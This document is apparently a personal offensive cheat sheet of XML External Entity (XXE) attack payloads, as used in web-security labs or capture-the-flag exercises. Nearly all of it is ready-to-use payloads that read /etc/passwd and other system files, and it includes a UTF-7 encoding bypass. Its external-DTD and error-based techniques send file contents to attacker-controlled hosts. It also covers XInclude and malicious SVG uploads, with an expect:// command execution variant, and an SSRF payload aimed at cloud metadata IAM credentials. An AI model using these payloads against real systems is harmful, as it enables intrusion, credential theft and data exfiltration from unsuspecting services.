# XXE

First things to try >

```bash
RETRIEVE DATA: <!DOCTYPE foo [<!ENTITY test SYSTEM "/etc/passwd"> ]>
SSRF: <!DOCTYPE foo [ <!ENTITY test SYSTEM "http://example.com/secret_key">]>
BLIND SSRF: <!DOCTYPE foo [ <!ENTITY test SYSTEM "https://mydomain.com"> ]>
PARAM ENTITY: <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://mydom.com"> %xxe; ]>
Bypass: <?xml version="1.0" encoding="UTF-7"?>+ADw-+ACE-DOCTYPE+ACA-replace+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-ent+ACA-SYSTEM+ACA-+ACI-file:///app/flag.txt+ACI-+AD4-+ACA-+AF0-+AD4-+AA0-+AAo-+ADw-data+AD4-+ADw-weight+AD4-+ACY-ent+ADs-+ADw-/weight+AD4-+ADw-height+AD4-156+ADw-/height+AD4-+ADw-/data+AD4-
```

- Tricky Techniques
    - Uses external DTD
        
        ```bash
        DTD FILE > 
        	<!ENTITY % file SYSTEM "file:///etc/passwd">
        	<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://me.com/?x=%file;'>">
        	%eval;
        	%exfiltrate;
        
        Hosts file on own server >
        	http://myserver.com/malicious.dtd
        
        Last payload >
        	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
        
        ---------------------------------------------------
        ---------------- ERROR BASED DTD ------------------
        ---------------------------------------------------
        
        	<!ENTITY % file SYSTEM "file:///etc/passwd">
        	<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
        	%eval;
        	%error;
        ```
        
    
    ```bash
    XInclude to retrieve file >
    
    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
    ```
    
    ```bash
    SVG Upload > ( Creates svg file with one of that contents )
    
    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
    
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
    
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
        <image xlink:href="expect://ls"></image>
    </svg>
    ```
    
- Examples
    
    ```bash
    ** SIMPLE ENTITY DECLARATION TEST **
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY test "3"> ]>
    <stockCheck>
        <productId>&test;</productId>
        <storeId>1</storeId>
    </stockCheck>
    ```
    
    ```bash
    ** FILE RETRIEVE **
    
    <?xml version="1.0" encoding="UTF-8"?>
    	<!DOCTYPE foo [<!ENTITY test SYSTEM "/etc/passwd"> ]>
    	<stockCheck>
    		<productId>
    			&test;
    		</productId>
    		<storeId>
    			1
    		</storeId>
    	</stockCheck>
    ```
    
    ```bash
    ** SSRF **
    <?xml version="1.0" encoding="UTF-8"?>
    **<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>**
    <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
    ```